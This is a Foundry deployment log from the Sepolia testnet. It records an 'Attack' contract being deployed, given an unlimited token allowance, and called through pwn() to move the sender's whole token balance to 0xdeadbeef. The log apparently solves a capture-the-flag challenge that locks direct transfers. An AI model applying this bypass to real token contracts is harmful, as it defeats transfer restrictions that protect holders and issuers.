{
  "transactions": [
    {
      "hash": "0x5c251d793aee39d6e01936563338fbc5e9d68d92d756f6b816894708d64a5ad5",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0xc862508873d95b368805229723a888bbaf3f41d0",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "gas": "0x55baa",
        "value": "0x0",
        "input": "0x6080604052348015600f57600080fd5b506103ec8061001f6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806302c6591d14610030575b600080fd5b61004361003e3660046102f6565b610045565b005b6040805180820182526015815274546f6b656e2042616c616e6365204265666f72652360581b602082015290516370a0823160e01b815233600482015282916100e3916001600160a01b038416906370a08231906024015b602060405180830381865afa1580156100ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100de9190610326565b610280565b6040516370a0823160e01b815233600482018190526000916001600160a01b038416916323b872dd9163deadbeef9084906370a0823190602401602060405180830381865afa15801561013a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061015e9190610326565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af11580156101b2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d6919061033f565b9050806102215760405162461bcd60e51b8152602060048201526015602482015274151bdad95b88151c985b9cd9995c8811985a5b1959605a1b604482015260640160405180910390fd5b6040805180820182526014815273546f6b656e2042616c616e63652041667465722360601b602082015290516370a0823160e01b815233600482015261027b91906001600160a01b038516906370a082319060240161009d565b505050565b6102c58282604051602401610296929190610361565b60408051601f198184030181529190526020810180516001600160e01b03166309710a9d60e41b1790526102c9565b5050565b6102d2816102d5565b50565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b60006020828403121561030857600080fd5b81356001600160a01b038116811461031f57600080fd5b9392505050565b60006020828403121561033857600080fd5b5051919050565b60006020828403121561035157600080fd5b8151801515811461031f57600080fd5b604081526000835180604084015260005b8181101561038f5760208187018101516060868401015201610372565b506000606082850101526060601f19601f830116840101915050826020830152939250505056fea2646970667358221220d60089f280acd9f1ac037e1caaaa06618d7c9ef1f0957b5519c8a1f4fd034a4b64736f6c63430008190033",
        "nonce": "0x92",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x8a1a44673f4173bea072658ad919a409aba8e7e9043ddccc3058cb142c3393a9",
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb7a88cec35c432597530536d0b50cac64abd3b8f",
      "function": "approve(address,uint256)",
      "arguments": [
        "0xC862508873d95b368805229723a888BbAf3F41d0",
        "115792089237316195423570985008687907853269984665640564039457584007913129639935"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0xb7a88cec35c432597530536d0b50cac64abd3b8f",
        "gas": "0x10a30",
        "value": "0x0",
        "input": "0x095ea7b3000000000000000000000000c862508873d95b368805229723a888bbaf3f41d0ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        "nonce": "0x93",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0x30f59b405e0783fc28ace4a1934d7d87b3ef1f178cca9687bedf9c81803dc463",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0xc862508873d95b368805229723a888bbaf3f41d0",
      "function": "pwn(address)",
      "arguments": [
        "0xb7A88Cec35c432597530536D0B50CAC64aBd3B8F"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0xc862508873d95b368805229723a888bbaf3f41d0",
        "gas": "0x13e0e",
        "value": "0x0",
        "input": "0x02c6591d000000000000000000000000b7a88cec35c432597530536d0b50cac64abd3b8f",
        "nonce": "0x94",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x8ecf22",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0x5c251d793aee39d6e01936563338fbc5e9d68d92d756f6b816894708d64a5ad5",
      "transactionIndex": "0x60",
      "blockHash": "0x54fe987435a9c86c3926a129fd2b894e398310cc6500c366e8fd8ebf4654bb47",
      "blockNumber": "0x658914",
      "gasUsed": "0x41f63",
      "effectiveGasPrice": "0x14416915e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": null,
      "contractAddress": "0xc862508873d95b368805229723a888bbaf3f41d0"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x8f8525",
      "logs": [
        {
          "address": "0xb7a88cec35c432597530536d0b50cac64abd3b8f",
          "topics": [
            "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925",
            "0x00000000000000000000000002a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
            "0x000000000000000000000000c862508873d95b368805229723a888bbaf3f41d0"
          ],
          "data": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
          "blockHash": "0x54fe987435a9c86c3926a129fd2b894e398310cc6500c366e8fd8ebf4654bb47",
          "blockNumber": "0x658914",
          "transactionHash": "0x8a1a44673f4173bea072658ad919a409aba8e7e9043ddccc3058cb142c3393a9",
          "transactionIndex": "0x61",
          "logIndex": "0x4e",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000002000000000000000000000000000000000000000000000000000000000000400020000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000004000000000000010000000000000000000000000000000000000000000000080000200000000",
      "type": "0x2",
      "transactionHash": "0x8a1a44673f4173bea072658ad919a409aba8e7e9043ddccc3058cb142c3393a9",
      "transactionIndex": "0x61",
      "blockHash": "0x54fe987435a9c86c3926a129fd2b894e398310cc6500c366e8fd8ebf4654bb47",
      "blockNumber": "0x658914",
      "gasUsed": "0xb603",
      "effectiveGasPrice": "0x14416915e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0xb7a88cec35c432597530536d0b50cac64abd3b8f",
      "contractAddress": null
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x906b6a",
      "logs": [
        {
          "address": "0xb7a88cec35c432597530536d0b50cac64abd3b8f",
          "topics": [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
            "0x00000000000000000000000002a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
            "0x00000000000000000000000000000000000000000000000000000000deadbeef"
          ],
          "data": "0x00000000000000000000000000000000000000000000d3c21bcecceda1000000",
          "blockHash": "0x54fe987435a9c86c3926a129fd2b894e398310cc6500c366e8fd8ebf4654bb47",
          "blockNumber": "0x658914",
          "transactionHash": "0x30f59b405e0783fc28ace4a1934d7d87b3ef1f178cca9687bedf9c81803dc463",
          "transactionIndex": "0x62",
          "logIndex": "0x4f",
          "removed": false
        }
      ],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000004000000000000000000000000000008000000000000000000000000000000000000000000008020000000000000000000000000000000000000000000000010000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000080000200000000",
      "type": "0x2",
      "transactionHash": "0x30f59b405e0783fc28ace4a1934d7d87b3ef1f178cca9687bedf9c81803dc463",
      "transactionIndex": "0x62",
      "blockHash": "0x54fe987435a9c86c3926a129fd2b894e398310cc6500c366e8fd8ebf4654bb47",
      "blockNumber": "0x658914",
      "gasUsed": "0xe645",
      "effectiveGasPrice": "0x14416915e",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0xc862508873d95b368805229723a888bbaf3f41d0",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1725785167,
  "chain": 11155111,
  "commit": "b020e18"
}